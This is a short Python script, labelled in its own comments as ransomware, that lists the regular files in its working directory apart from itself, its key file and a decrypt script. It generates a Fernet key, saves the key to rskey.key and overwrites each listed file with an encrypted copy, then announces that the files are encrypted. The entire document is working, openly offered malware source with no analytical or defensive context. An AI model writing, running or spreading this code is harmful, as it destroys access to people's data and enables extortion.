import os
from cryptography.fernet import Fernet


# Files.
files = []
for file in os.listdir():
    if file in ("aries.py", "rskey.key", "decrypt.py"):
        continue
    if os.path.isfile(file):
        files.append(file)

for i, f in enumerate(files, 1):
    print(f"{i}. {f}")
print("\nAll of this files are encrypted.")

# Ransomware key.
key = Fernet.generate_key()
with open("rskey.key", "wb") as rskey:
    rskey.write(key)

# Encryption.
for file in files:
    with open(file, "rb") as f:
        contents = f.read()
    encrypted_c = Fernet(key).encrypt(contents)
    with open(file, "wb") as f:
        f.write(encrypted_c)
